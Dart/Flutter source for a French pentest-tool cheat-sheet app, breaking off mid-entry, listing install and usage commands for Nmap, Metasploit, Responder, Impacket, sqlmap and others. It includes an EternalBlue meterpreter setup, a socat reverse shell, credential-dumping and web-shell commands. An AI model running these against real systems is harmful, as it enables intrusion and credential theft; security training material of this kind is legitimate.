
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

void main() {
  runApp(const VxKitApp());
}

class VxKitApp extends StatelessWidget {
  const VxKitApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'VxKit',
      theme: ThemeData(
        brightness: Brightness.dark,
        scaffoldBackgroundColor: Colors.black,
        primaryColor: Colors.white,
        appBarTheme: const AppBarTheme(
          backgroundColor: Colors.black,
          elevation: 0,
        ),
      ),
      home: const MainNavigation(),
    );
  }
}

// --- Modele de donnees de l'application ---
class PentestTool {
  final String name;
  final String description;
  final String category; // Réseau, Web, Wifi, Reversing, Passwords
  final IconData icon;
  final Map<String, String> installCommands;
  final List<ToolUsageExample> usages;

  const PentestTool({
    required this.name, 
    required this.description, 
    required this.category,
    required this.icon, 
    required this.installCommands,
    required this.usages,
  });
}

class ToolUsageExample {
  final String title;
  final String command;
  final String explanation;

  const ToolUsageExample({
    required this.title,
    required this.command,
    required this.explanation,
  });
}

class UpdateRelease {
  final String version;
  final String date;
  final List<String> changes;

  const UpdateRelease({
    required this.version,
    required this.date,
    required this.changes,
  });
}

class MainNavigation extends StatefulWidget {
  const MainNavigation({super.key});

  @override
  State<MainNavigation> createState() => _MainNavigationState();
}

class _MainNavigationState extends State<MainNavigation> {
  int _selectedIndex = 0;

  final List<Widget> _pages = [
    const ToolsPage(),
    const CommandsQuickPage(),
    const UpdatesPage(),
    const VxAboutPage(),
  ];

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: IndexedStack(
        index: _selectedIndex,
        children: _pages,
      ),
      bottomNavigationBar: Container(
        decoration: BoxDecoration(
          border: Border(top: BorderSide(color: Colors.white.withOpacity(0.08), width: 0.5)),
        ),
        child: BottomNavigationBar(
          currentIndex: _selectedIndex,
          onTap: (index) => setState(() => _selectedIndex = index),
          backgroundColor: Colors.black,
          selectedItemColor: Colors.white,
          unselectedItemColor: Colors.grey[800],
          showSelectedLabels: true,
          showUnselectedLabels: false,
          type: BottomNavigationBarType.fixed,
          items: const [
            BottomNavigationBarItem(icon: Icon(Icons.grid_view_sharp), label: 'Outils'),
            BottomNavigationBarItem(icon: Icon(Icons.bolt), label: 'Quick'),
            BottomNavigationBarItem(icon: Icon(Icons.update), label: 'Updates'),
            BottomNavigationBarItem(icon: Icon(Icons.security), label: 'Vx'),
          ],
        ),
      ),
    );
  }
}

// --- Page 1: Gestion des catégories et liste d'outils ---
class ToolsPage extends StatefulWidget {
  const ToolsPage({super.key});

  @override
  State<ToolsPage> createState() => _ToolsPageState();
}

class _ToolsPageState extends State<ToolsPage> {
  String? _selectedCategory;

  // Liste des catégories définies
  final List<Map<String, dynamic>> _categories = [
    {"name": "Réseau", "icon": Icons.settings_input_antenna, "count": 12},
    {"name": "Web", "icon": Icons.language, "count": 10},
    {"name": "Passwords", "icon": Icons.vpn_key, "count": 4},
    {"name": "Wifi", "icon": Icons.wifi, "count": 2},
    {"name": "Reversing", "icon": Icons.developer_board, "count": 4},
  ];

  static const List<PentestTool> tools = [
    // --- CATEGORIE: RESEAU (12 outils) ---
    PentestTool(
      name: "Nmap",
      category: "Réseau",
      description: "Le patron incontournable pour scanner les ports ouverts et identifier les services réseau actifs.",
      icon: Icons.radar,
      installCommands: {
        "iSH": "apk update && apk add nmap",
        "Termux": "pkg update && pkg install nmap -y",
        "Windows": "Exécutez l'installeur officiel nmap-setup.exe",
      },
      usages: [
        ToolUsageExample(
          title: "Scan rapide de base",
          command: "nmap target.com",
          explanation: "Scan rapide des 1000 ports les plus courants pour repérer ce qui est ouvert.",
        ),
        ToolUsageExample(
          title: "Détection de version et d'OS",
          command: "nmap -sV -O target.com",
          explanation: "Analyse les bannières pour obtenir les versions des services et estime l'OS de la cible.",
        ),
        ToolUsageExample(
          title: "Scan furtif SYN avec timing agressif",
          command: "nmap -sS -T4 target.com",
          explanation: "Scan de type half-open pour éviter de saturer ou d'alerter les pare-feu trop rapidement.",
        ),
        ToolUsageExample(
          title: "Scan complet de tous les ports (1 à 65535)",
          command: "nmap -p- -T4 target.com",
          explanation: "Analyse absolument tous les ports existants sans exception pour ne rien louper.",
        )
      ],
    ),
    PentestTool(
      name: "Metasploit",
      category: "Réseau",
      description: "L'artillerie lourde pour exploiter les failles de sécurité, mener des tests de pénétration et faire de la post-exploitation.",
      icon: Icons.bug_report_outlined,
      installCommands: {
        "iSH": "# Trop lourd pour iSH. Montez plutôt un VPS Kali externe accessible en SSH.",
        "Termux": "pkg update && pkg install unstable-repo -y && pkg install metasploit -y",
        "Windows": "Installez l'exécutable officiel depuis l'installateur Rapid7.",
      },
      usages: [
        ToolUsageExample(
          title: "Lancer la console",
          command: "msfconsole -q",
          explanation: "Démarre l'interface Metasploit en mode silencieux sans afficher la bannière d'accueil.",
        ),
        ToolUsageExample(
          title: "Rechercher un exploit spécifique",
          command: "search eternalblue",
          explanation: "Parcourt la base de données interne pour trouver des modules d'exploitation liés à un mot-clé.",
        ),
        ToolUsageExample(
          title: "Charger et configurer un module",
          command: "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.50\nset PAYLOAD windows/x64/meterpreter/reverse_tcp",
          explanation: "Sélectionne l'exploit EternalBlue, définit l'adresse de la cible et prépare le payload de retour.",
        ),
        ToolUsageExample(
          title: "Lancer l'attaque",
          command: "exploit",
          explanation: "Déclenche l'envoi de l'exploit vers l'adresse IP configurée pour obtenir votre accès.",
        )
      ],
    ),
    PentestTool(
      name: "Netcat (nc)",
      category: "Réseau",
      description: "Le couteau suisse absolu pour lire, écrire et rediriger des données à travers les connexions réseau.",
      icon: Icons.settings_ethernet,
      installCommands: {
        "iSH": "apk add netcat-openbsd",
        "Termux": "pkg install netcat -y",
        "Windows": "Téléchargez nc.exe et placez-le dans votre System32.",
      },
      usages: [
        ToolUsageExample(
          title: "Mettre un port en écoute (Listener)",
          command: "nc -lvnp 4444",
          explanation: "Ouvre le port local 4444 en attente d'une connexion entrante (idéal pour attraper un Reverse Shell).",
        ),
        ToolUsageExample(
          title: "Se connecter à un port distant",
          command: "nc -v 192.168.1.10 80",
          explanation: "Initie une connexion directe vers l'adresse IP spécifiée sur le port 80 pour tester si le service répond.",
        ),
        ToolUsageExample(
          title: "Transférer un fichier (Récepteur)",
          command: "nc -lvnp 9000 > recu.txt",
          explanation: "Attend un flux sur le port 9000 et enregistre automatiquement toutes les données reçues dans un fichier.",
        ),
        ToolUsageExample(
          title: "Transférer un fichier (Émetteur)",
          command: "nc -w 3 192.168.1.50 9000 < envoyer.txt",
          explanation: "Se connecte à la machine réceptrice et envoie le contenu du fichier texte local.",
        )
      ],
    ),
    PentestTool(
      name: "Tshark (Wireshark)",
      category: "Réseau",
      description: "Analyseur de paquets réseau Wireshark décliné en version ligne de commande.",
      icon: Icons.analytics,
      installCommands: {
        "iSH": "apk add tshark",
        "Termux": "# Root requis sur Android\ntshark -h",
        "Windows": "Disponible d'office dans le dossier d'installation de Wireshark.",
      },
      usages: [
        ToolUsageExample(
          title: "Lister les interfaces réseau",
          command: "tshark -D",
          explanation: "Affiche toutes les cartes réseau disponibles sur la machine pour pouvoir choisir laquelle écouter.",
        ),
        ToolUsageExample(
          title: "Capturer le trafic en direct",
          command: "tshark -i eth0",
          explanation: "Affiche en temps réel les paquets circulant sur l'interface 'eth0'.",
        ),
        ToolUsageExample(
          title: "Filtrer uniquement le trafic Web (HTTP)",
          command: "tshark -i eth0 -Y \"http.request\"",
          explanation: "Filtre le flux en direct pour n'afficher que les requêtes HTTP entrantes ou sortantes.",
        ),
        ToolUsageExample(
          title: "Sauvegarder la capture dans un fichier .pcap",
          command: "tshark -i eth0 -w capture_reseau.pcap",
          explanation: "Enregistre l'ensemble des paquets interceptés pour pouvoir les analyser plus tard dans Wireshark.",
        )
      ],
    ),
    PentestTool(
      name: "Searchsploit",
      category: "Réseau",
      description: "Utilitaire hors-ligne pour rechercher instantanément des exploits dans l'archive locale d'Exploit-DB.",
      icon: Icons.manage_search,
      installCommands: {
        "iSH": "apk add git python3 && git clone https://github.com/offensive-security/exploitdb.git /opt/exploitdb && ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit",
        "Termux": "pkg install exploitdb -y",
        "Windows": "Cloner le dépôt officiel et lancer searchsploit.py via Python.",
      },
      usages: [
        ToolUsageExample(
          title: "Rechercher par service ou logiciel",
          command: "searchsploit apache 2.4.41",
          explanation: "Affiche tous les exploits publics connus pour cette version spécifique du serveur Web Apache.",
        ),
        ToolUsageExample(
          title: "Recherche stricte par identifiant CVE",
          command: "searchsploit cve-2019-0708",
          explanation: "Trouve les codes d'exploits correspondants à la vulnérabilité BlueKeep (RDP Windows).",
        ),
        ToolUsageExample(
          title: "Copier le code de l'exploit localement",
          command: "searchsploit -m 47438",
          explanation: "Copie automatiquement l'exploit numéro 47438 dans votre répertoire de travail actuel.",
        ),
        ToolUsageExample(
          title: "Recherche en ignorant les faux positifs",
          command: "searchsploit -t windows smb",
          explanation: "Filtre la recherche uniquement sur le titre de l'exploit pour éviter d'obtenir trop de résultats génériques.",
        )
      ],
    ),
    PentestTool(
      name: "Responder",
      category: "Réseau",
      description: "Empoisonneur de requêtes réseau LLMNR, NBT-NS et MDNS capable de voler des hashs d'authentification Windows sur un réseau local.",
      icon: Icons.settings_input_antenna,
      installCommands: {
        "iSH": "apk add python3 git && git clone https://github.com/lgandx/Responder.git",
        "Termux": "# Privilèges Root indispensables sur votre appareil Android.",
        "Windows": "# Non disponible. Utilisez une machine Linux Kali dédiée.",
      },
      usages: [
        ToolUsageExample(
          title: "Lancer l'écoute passive",
          command: "python3 Responder.py -I eth0 -w -d",
          explanation: "Démarre l'empoisonnement sur l'interface eth0 en activant la résolution WPAD et le sniffing d'identifiants.",
        ),
        ToolUsageExample(
          title: "Analyser les requêtes sans empoisonner",
          command: "python3 Responder.py -I eth0 -A",
          explanation: "Mode d'analyse passive uniquement (très discret, permet de voir les requêtes sans injecter de paquets sur le LAN).",
        ),
        ToolUsageExample(
          title: "Forcer l'authentification basique",
          command: "python3 Responder.py -I eth0 -b",
          explanation: "Demande aux clients de s'authentifier en clair si l'authentification réseau par hash échoue.",
        ),
        ToolUsageExample(
          title: "Désactiver le serveur WPAD proxy",
          command: "python3 Responder.py -I eth0 --no-wpad",
          explanation: "Lance Responder en ignorant les requêtes de configuration automatique de proxy pour rester un peu plus discret.",
        )
      ],
    ),
    PentestTool(
      name: "Impacket",
      category: "Réseau",
      description: "Une suite incroyable de scripts Python pour manipuler de manière chirurgicale les protocoles de bas niveau (SMB, Kerberos, AD).",
      icon: Icons.layers,
      installCommands: {
        "iSH": "apk add python3 python3-dev build-base libffi-dev openssl-dev && pip3 install impacket",
        "Termux": "pkg install python python-cryptography -y && pip install impacket",
        "Windows": "pip install impacket",
      },
      usages: [
        ToolUsageExample(
          title: "Obtenir un Shell à distance via SMB (psexec)",
          command: "psexec.py administrator@192.168.1.10",
          explanation: "Se connecte sur une machine Windows avec des droits admin pour ouvrir un shell système à distance.",
        ),
        ToolUsageExample(
          title: "Exécuter des commandes via WMI (wmiexec)",
          command: "wmiexec.py Administrator@192.168.1.10 \"whoami\"",
          explanation: "Alternative beaucoup plus discrète à psexec qui n'installe aucun service sur la cible pour exécuter du code.",
        ),
        ToolUsageExample(
          title: "Dumper les hashs de la SAM locale",
          command: "secretsdump.py -local -system system.hiv -sam sam.hiv secrets.txt",
          explanation: "Extrait les mots de passe locaux d'une base de registre Windows hors-ligne préalablement récupérée.",
        ),
        ToolUsageExample(
          title: "Attaque AS-REP Roasting (Kerberos)",
          command: "GetNPUsers.py domain.local/ -no-pass -usersfile users.txt",
          explanation: "Tente d'extraire les tickets d'authentification Kerberos sans mot de passe pour les casser hors-ligne plus tard.",
        )
      ],
    ),
    PentestTool(
      name: "CrackMapExec",
      category: "Réseau",
      description: "L'outil roi pour auditer la sécurité des environnements Windows Active Directory de manière rapide et automatisée.",
      icon: Icons.dns,
      installCommands: {
        "iSH": "# Non recommandé. Dépendances Active Directory beaucoup trop lourdes.",
        "Termux": "pip install crackmapexec",
        "Windows": "pip install crackmapexec",
      },
      usages: [
        ToolUsageExample(
          title: "Scanner un réseau local (SMB)",
          command: "cme smb 192.168.1.0/24",
          explanation: "Scanne l'ensemble d'un sous-réseau pour identifier les machines Windows actives et leurs configurations SMB.",
        ),
        ToolUsageExample(
          title: "Tester des identifiants sur tout le parc",
          command: "cme smb 192.168.1.0/24 -u administrator -p P@ssword123",
          explanation: "Teste la validité du mot de passe Administrateur sur toutes les machines du réseau simultanément.",
        ),
        ToolUsageExample(
          title: "Lister les partages réseaux accessibles",
          command: "cme smb 192.168.1.100 -u 'user' -p 'pass' --shares",
          explanation: "Se connecte à une cible et énumère tous les dossiers partagés ainsi que vos droits d'accès dessus.",
        ),
        ToolUsageExample(
          title: "Dumper la base LSASS (Mots de passe en mémoire)",
          command: "cme smb 192.168.1.100 -u 'admin' -p 'pass' --lsa",
          explanation: "Extrait les secrets d'authentification et mots de passe stockés en mémoire si vous êtes administrateur local.",
        )
      ],
    ),
    PentestTool(
      name: "Bettercap",
      category: "Réseau",
      description: "Framework performant d'analyse et d'attaques réseau de l'homme du milieu (MITM) en direct.",
      icon: Icons.security,
      installCommands: {
        "iSH": "# Impossible d'accéder directement à l'interface réseau physique sous iSH.",
        "Termux": "pkg install bettercap -y",
        "Windows": "Téléchargez et exécutez le binaire officiel bettercap.exe.",
      },
      usages: [
        ToolUsageExample(
          title: "Lancer l'outil sur une carte réseau",
          command: "bettercap -iface wlan0",
          explanation: "Démarre la console d'écoute réseau sur votre carte sans fil.",
        ),
        ToolUsageExample(
          title: "Activer la détection automatique d'appareils",
          command: "net.probe on",
          explanation: "Envoie régulièrement des paquets pour répertorier en direct toutes les machines connectées sur votre réseau local.",
        ),
        ToolUsageExample(
          title: "Lancer une attaque de spoofing ARP",
          command: "set arp.spoof.targets 192.168.1.20\narp.spoof on",
          explanation: "Se positionne comme intermédiaire entre le routeur et la machine cible pour intercepter tout son trafic.",
        ),
        ToolUsageExample(
          title: "Sniffer les requêtes DNS interceptées",
          command: "net.sniff on",
          explanation: "Commence à analyser et afficher en clair tout le flux réseau détourné.",
        )
      ],
    ),
    PentestTool(
      name: "Socat",
      category: "Réseau",
      description: "Alternative moderne et beaucoup plus polyvalente que Netcat, capable de créer des canaux de données bidirectionnels de tout type.",
      icon: Icons.swap_horiz,
      installCommands: {
        "iSH": "apk add socat",
        "Termux": "pkg install socat -y",
        "Windows": "Téléchargez le fichier socat.exe précompilé pour Windows.",
      },
      usages: [
        ToolUsageExample(
          title: "Créer un Listener de port TCP",
          command: "socat TCP-LISTEN:4444 -",
          explanation: "Écoute sur le port 4444 et redirige tout ce qu'il reçoit vers la console standard (le terminal).",
        ),
        ToolUsageExample(
          title: "Rediriger un port local vers une autre machine",
          command: "socat TCP-LISTEN:80,fork TCP:192.168.1.50:80",
          explanation: "Prend tout le trafic arrivant sur votre port 80 local et le renvoie de manière transparente vers une autre IP.",
        ),
        ToolUsageExample(
          title: "Créer un Reverse Shell interactif sécurisé",
          command: "socat TCP-LISTEN:4444,reuseaddr FILE:`tty`,raw,echo=0",
          explanation: "Ouvre un listener hautement optimisé pour obtenir un terminal distant interactif sans bug de raccourcis clavier.",
        ),
        ToolUsageExample(
          title: "Lancer un Shell distant (Côté Cible)",
          command: "socat TCP:192.168.1.10:4444 EXEC:/bin/bash",
          explanation: "Se connecte à l'attaquant et lui donne le contrôle de la console bash de la machine.",
        )
      ],
    ),
    PentestTool(
      name: "Amass",
      category: "Réseau",
      description: "Outil ultra-performant de cartographie de serveurs et de découverte DNS active/passive.",
      icon: Icons.bubble_chart,
      installCommands: {
        "iSH": "apk add amass",
        "Termux": "pkg install amass -y",
        "Windows": "Téléchargez l'archive binaire officielle et ajoutez-la à votre variable PATH.",
      },
      usages: [
        ToolUsageExample(
          title: "Recherche de sous-domaines passive (rapide)",
          command: "amass enum -passive -d target.com",
          explanation: "Interroge des bases de données en ligne publiques sans jamais envoyer un seul paquet à la cible pour rester discret.",
        ),
        ToolUsageExample(
          title: "Énumération active complète",
          command: "amass enum -active -d target.com -p 80,443",
          explanation: "Vérifie les DNS, tente des transferts de zones et teste la connectivité sur les ports spécifiés.",
        ),
        ToolUsageExample(
          title: "Sauvegarder les résultats dans une base de données",
          command: "amass enum -d target.com -dir ./mon_projet",
          explanation: "Enregistre tous les résultats collectés dans un dossier local pour pouvoir suivre l'évolution de la cible.",
        ),
        ToolUsageExample(
          title: "Afficher le bilan graphique des découvertes",
          command: "amass viz -gex -dir ./mon_projet",
          explanation: "Génère un fichier de visualisation au format Graphistry ou Gephi pour modéliser le réseau de la cible.",
        )
      ],
    ),
    PentestTool(
      name: "DNSRecon",
      category: "Réseau",
      description: "Script d'énumération DNS avancé gérant les transferts de zone, les enregistrements SRV et la résolution inverse.",
      icon: Icons.explore,
      installCommands: {
        "iSH": "apk add python3 pip3 && pip3 install dnsrecon",
        "Termux": "pkg install python -y && pip install dnsrecon",
        "Windows": "pip install dnsrecon",
      },
      usages: [
        ToolUsageExample(
          title: "Énumération DNS standard",
          command: "dnsrecon -d target.com",
          explanation: "Récupère les enregistrements MX, TXT, A, NS et SOA courants de la cible.",
        ),
        ToolUsageExample(
          title: "Tenter un transfert de zone DNS",
          command: "dnsrecon -d target.com -t axfr",
          explanation: "Tente de demander à chaque serveur de noms la copie entière de sa table DNS (faille de configuration courante).",
        ),
        ToolUsageExample(
          title: "Brute-force de sous-domaines par dictionnaire",
          command: "dnsrecon -d target.com -D wordlist.txt -t brt",
          explanation: "Teste des milliers de noms de sous-domaines pour voir si les adresses IP correspondantes existent.",
        ),
        ToolUsageExample(
          title: "Résolution inversée d'une plage IP",
          command: "dnsrecon -r 192.168.1.1-192.168.1.254",
          explanation: "Parcourt une plage d'adresses IP pour trouver les noms d'hôtes associés enregistrés dans les DNS.",
        )
      ],
    ),

    // --- CATEGORIE: WEB (10 outils) ---
    PentestTool(
      name: "Sqlmap",
      category: "Web",
      description: "L'outil roi pour détecter et exploiter de manière automatique les failles d'injections SQL sur des sites Web.",
      icon: Icons.storage,
      installCommands: {
        "iSH": "apk add python3 git && git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git",
        "Termux": "pkg install python git -y && git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git",
        "Windows": "python.exe sqlmap.py -u \"http://target.com/index.php?id=1\" --batch",
      },
      usages: [
        ToolUsageExample(
          title: "Détection simple et rapide",
          command: "python sqlmap.py -u \"http://target.com/index.php?id=1\"",
          explanation: "Analyse le paramètre 'id' de l'URL pour voir s'il est vulnérable aux injections SQL.",
        ),
        ToolUsageExample(
          title: "Lister les bases de données",
          command: "python sqlmap.py -u \"http://target.com/index.php?id=1\" --dbs",
          explanation: "Si le site est vulnérable, récupère et affiche le nom de toutes les bases de données du serveur.",
        ),
        ToolUsageExample(
          title: "Dumper le contenu d'une table",
          command: "python sqlmap.py -u \"http://target.com/index.php?id=1\" -D mabase -T users --dump",
          explanation: "Récupère l'intégralité du contenu de la table 'users' de la base 'mabase' et l'affiche à l'écran.",
        ),
        ToolUsageExample(
          title: "Tenter d'ouvrir un Shell système",
          command: "python sqlmap.py -u \"http://target.com/index.php?id=1\" --os-shell",
          explanation: "Si les droits sont suffisants, téléverse un script web sur le serveur pour vous donner une console de commande.",
        )
      ],
    ),
    PentestTool(
      name: "Nikto",
      category: "Web",
      description: "Scanner de vulnérabilités pour serveurs Web qui recherche les fichiers dangereux, les scripts obsolètes et les erreurs de configuration.",
      icon: Icons.find_in_page,
      installCommands: {
        "iSH": "apk add perl git && git clone https://github.com/sullo/nikto.git",
        "Termux": "pkg install perl git -y && git clone https://github.com/sullo/nikto.git",
        "Windows": "Installez Perl pour Windows puis exécutez nikto.pl.",
      },
      usages: [
        ToolUsageExample(
          title: "Scan standard d'un hôte",
          command: "perl nikto.pl -h http://target.com",
          explanation: "Lance un scan de sécurité classique sur le site ciblé sur les ports standard.",
        ),
        ToolUsageExample(
          title: "Scan d'un port spécifique",
          command: "perl nikto.pl -h 192.168.1.100 -p 8080",
          explanation: "Analyse le serveur Web actif sur un port alternatif (ici 8080).",
        ),
        ToolUsageExample(
          title: "Scanner via un proxy anonyme",
          command: "perl nikto.pl -h target.com -useproxy http://127.0.0.1:8080",
          explanation: "Fait passer les requêtes du scanneur par un proxy (comme Burp Suite ou Tor) pour masquer votre IP.",
        ),
        ToolUsageExample(
          title: "Exporter le rapport d'analyse en HTML",
          command: "perl nikto.pl -h target.com -o rapport.html -Format htm",
          explanation: "Génère un rapport visuel très propre récapitulant toutes les failles trouvées.",
        )
      ],
    ),
    PentestTool(
      name: "Dirb",
      category: "Web",
      description: "Scanner de contenu web par dictionnaire recherchant les dossiers et fichiers cachés d'un serveur.",
      icon: Icons.folder,
      installCommands: {
        "iSH": "apk add curl git make build-base # Compilation manuelle requise.",
        "Termux": "pkg install dirb -y",
        "Windows": "Téléchargez l'exécutable dirb.exe compilé pour Windows.",
      },
      usages: [
        ToolUsageExample(
          title: "Scan simple par défaut",
          command: "dirb http://target.com/",
          explanation: "Scanne le site web en utilisant le dictionnaire par défaut intégré à Dirb.",
        ),
        ToolUsageExample(
          title: "Utiliser une wordlist personnalisée",
          command: "dirb http://target.com/ ma_liste.txt",
          explanation: "Utilise votre propre liste de mots pour cibler des dossiers spécifiques à un domaine.",
        ),
        ToolUsageExample(
          title: "Chercher des extensions de fichiers précises",
          command: "dirb http://target.com/ -X .php,.txt,.zip",
          explanation: "Filtre le scan pour trouver uniquement des scripts PHP, fichiers texte ou archives zip.",
        ),
        ToolUsageExample(
          title: "Ignorer certains codes de réponse HTTP",
          command: "dirb http://target.com/ -N 403",
          explanation: "Masque de l'affichage toutes les pages qui renvoient une erreur d'accès interdit (403).",
        )
      ],
    ),
    PentestTool(
      name: "Gobuster",
      category: "Web",
      description: "Brute-forceur de répertoires, sous-domaines et vhosts écrit en Go, extrêmement rapide grâce au multi-threading.",
      icon: Icons.travel_explore,
      installCommands: {
        "iSH": "apk add go && go install github.com/OJ/gobuster/v3@latest",
        "Termux": "pkg install gobuster -y",
        "Windows": "Exécutez le binaire gobuster.exe précompilé pour Windows.",
      },
      usages: [
        ToolUsageExample(
          title: "Scanner les dossiers d'un site",
          command: "gobuster dir -u http://target.com -w wordlist.txt",
          explanation: "Recherche des répertoires masqués sur le serveur Web cible.",
        ),
        ToolUsageExample(
          title: "Brute-forcer les sous-domaines DNS",
          command: "gobuster dns -d target.com -w sous_domaines.txt",
          explanation: "Découvre les sous-domaines actifs associés à un nom de domaine principal.",
        ),
        ToolUsageExample(
          title: "Désactiver la vérification SSL",
          command: "gobuster dir -u https://target.com -w wordlist.txt -k",
          explanation: "Ignore les avertissements liés aux certificats SSL obsolètes ou auto-signés du site.",
        ),
        ToolUsageExample(
          title: "Définir le nombre de requêtes simultanées",
          command: "gobuster dir -u http://target.com -w wordlist.txt -t 50",
          explanation: "Configure 50 threads simultanés pour accélérer drastiquement la vitesse du scan.",
        )
      ],
    ),
    PentestTool(
      name: "WPScan",
      category: "Web",
      description: "Le scanneur de sécurité de référence pour auditer et repérer les failles sur les sites gérés par WordPress.",
      icon: Icons.web,
      installCommands: {
        "iSH": "apk add ruby ruby-dev build-base libxml2-dev libxslt-dev && gem install wpscan",
        "Termux": "pkg install ruby libxml2 libxslt -y && gem install wpscan",
        "Windows": "Installez Ruby pour Windows puis tapez: gem install wpscan.",
      },
      usages: [
        ToolUsageExample(
          title: "Scan de sécurité de base",
          command: "wpscan --url http://target.com",
          explanation: "Identifie la version de WordPress installée et liste les failles connues associées.",
        ),
        ToolUsageExample(
          title: "Lister les utilisateurs du site",
          command: "wpscan --url http://target.com --enumerate u",
          explanation: "Récupère la liste des auteurs et administrateurs enregistrés sur le blog WordPress.",
        ),
        ToolUsageExample(
          title: "Lister les plugins vulnérables",
          command: "wpscan --url http://target.com --enumerate vp",
          explanation: "Scanne et liste uniquement les extensions installées contenant des vulnérabilités connues.",
        ),
        ToolUsageExample(
          title: "Attaque brute-force sur un compte",
          command: "wpscan --url http://target.com -U admin -P rockyou.txt",
          explanation: "Tente de trouver le mot de passe de l'utilisateur 'admin' à l'aide d'une liste de mots.",
        )
      ],
    ),
    PentestTool(
      name: "Commix",
      category: "Web",
      description: "Outil automatisé d'exploitation et de détection des vulnérabilités d'injections de commandes système sur les serveurs d'applications web.",
      icon: Icons.code,
      installCommands: {
        "iSH": "apk add python3 git && git clone https://github.com/commixproject/commix.git",
        "Termux": "pkg install python git -y && git clone https://github.com/commixproject/commix.git",
        "Windows": "Lancer commix.py via l'invite de commande Python.",
      },
      usages: [
        ToolUsageExample(
          title: "Test d'injection basique",
          command: "python commix.py --url=\"http://target.com/page.php?addr=127.0.0.1\"",
          explanation: "Teste automatiquement si le paramètre 'addr' exécute des commandes directement sur la machine hôte.",
        ),
        ToolUsageExample(
          title: "Tester une requête POST",
          command: "python commix.py --url=\"http://target.com/login.php\" --data=\"user=test&ip=127.0.0.1\"",
          explanation: "Analyse les paramètres d'un formulaire envoyé en méthode HTTP POST.",
        ),
        ToolUsageExample(
          title: "Spécifier le système d'exploitation cible",
          command: "python commix.py --url=\"http://target.com/index.php?p=1\" --os=windows",
          explanation: "Optimise le scan en tentant uniquement des commandes adaptées à l'environnement Windows.",
        ),
        ToolUsageExample(
          title: "Obtenir une console système interactive",
          command: "python commix.py --url=\"http://target.com/page.php?id=1\" --install-shell",
          explanation: "Téléverse un mini-shell sur le serveur Web pour vous donner une console de commande persistante.",
        )
      ],
    ),
    PentestTool(
      name: "Nuclei",
      category: "Web",
      description: "Scanner de vulnérabilités moderne et ultra-rapide basé sur des modèles YAML personnalisables.",
      icon: Icons.flash_on,
      installCommands: {
        "iSH": "apk add go && go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest",
        "Termux": "pkg install nuclei -y",
        "Windows": "Exécutez le binaire nuclei.exe précompilé pour Windows.",
      },
      usages: [
        ToolUsageExample(
          title: "Scanner un site Web cible",
          command: "nuclei -u http://target.com",
          explanation: "Lance l'ensemble des règles de sécurité de base sur l'URL ciblée.",
        ),
        ToolUsageExample(
          title: "Exécuter des templates de sécurité spécifiques",
          command: "nuclei -u http://target.com -t cves/2021/",
          explanation: "Limite l'analyse uniquement aux vulnérabilités connues enregistrées en l'an 2021.",
        ),
        ToolUsageExample(
          title: "Scanner une liste d'adresses Web",
          command: "nuclei -list sites_a_scanner.txt",
          explanation: "Parcourt et analyse de façon industrielle une liste de dizaines de sites internet listés dans un fichier.",
        ),
        ToolUsageExample(
          title: "Mettre à jour la base de templates",
          command: "nuclei -update-templates",
          explanation: "Télécharge les dernières règles de détection écrites par la communauté de chercheurs en sécurité.",
        )
      ],
    ),
    PentestTool(
      name: "Subfinder",
      category: "Web",
      description: "Outil d'énumération de sous-domaines passifs rapide utilisant diverses APIs publiques en ligne.",
      icon: Icons.pageview,
      installCommands: {
        "iSH": "apk add go && go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
        "Termux": "pkg install subfinder -y",
        "Windows": "Exécutez subfinder.exe disponible officiellement sur GitHub.",
      },
      usages: [
        ToolUsageExample(
          title: "Énumération passive d'un domaine",
          command: "subfinder -d target.com",
          explanation: "Découvre les sous-domaines d'un site à l'aide de sources ouvertes en ligne sans envoyer de requêtes directes.",
        ),
        ToolUsageExample(
          title: "Sauvegarder les résultats",
          command: "subfinder -d target.com -o resultats.txt",
          explanation: "Enregistre automatiquement tous les sous-domaines découverts dans un fichier texte.",
        ),
        ToolUsageExample(
          title: "Mode silencieux (Sortie propre)",
          command: "subfinder -d target.com -silent",
          explanation: "Désactive la bannière d'accueil et n'affiche que les sous-domaines trouvés (idéal pour lier à d'autres outils).",
        ),
        ToolUsageExample(
          title: "Vérifier la connectivité des sous-domaines",
          command: "subfinder -d target.com -silent | httpx",
          explanation: "Envoie la liste des sous-domaines directement à httpx pour tester s'ils hébergent un site actif.",
        )
      ],
    ),
    PentestTool(
      name: "WhatWeb",
      category: "Web",
      description: "Identificateur de technologies web qui repère les CMS, les plugins, les serveurs et les bibliothèques d'un site.",
      icon: Icons.language,
      installCommands: {
        "iSH": "apk add ruby curl && git clone https://github.com/urbanadventurer/WhatWeb.git",
        "Termux": "pkg install ruby -y && git clone https://github.com/urbanadventurer/WhatWeb.git",
        "Windows": "ruby.exe whatweb target.com",
      },
      usages: [
        ToolUsageExample(
          title: "Identification technologique standard",
          command: "ruby whatweb target.com",
          explanation: "Analyse les en-têtes et le code HTML pour identifier les systèmes utilisés.",
        ),
        ToolUsageExample(
          title: "Niveau d'analyse approfondie (Agressif)",
          command: "ruby whatweb -a 3 target.com",
          explanation: "Lance une recherche beaucoup plus poussée en tentant d'accéder à des répertoires techniques du serveur.",
        ),
        ToolUsageExample(
          title: "Scanner un bloc d'adresses IP",
          command: "ruby whatweb 192.168.1.0/24",
          explanation: "Identifie toutes les applications Web actives sur l'ensemble d'un sous-réseau local.",
        ),
        ToolUsageExample(
          title: "Affichage des résultats sous forme synthétique",
          command: "ruby whatweb -v target.com",
          explanation: "Fournit une description détaillée et ordonnée de chaque élément identifié sur la cible.",
        )
      ],
    ),
    PentestTool(
      name: "Wfuzz",
      category: "Web",
      description: "Framework de brute-force et de fuzzing d'applications web très personnalisable facilitant l'injection de paramètres.",
      icon: Icons.pattern,
      installCommands: {
        "iSH": "apk add python3 pip3 python3-dev build-base curl-dev && pip3 install wfuzz",
        "Termux": "pkg install python -y && pip install wfuzz",
        "Windows": "pip install wfuzz",
      },
      usages: [
        ToolUsageExample(
          title: "Fuzzing classique de dossiers",
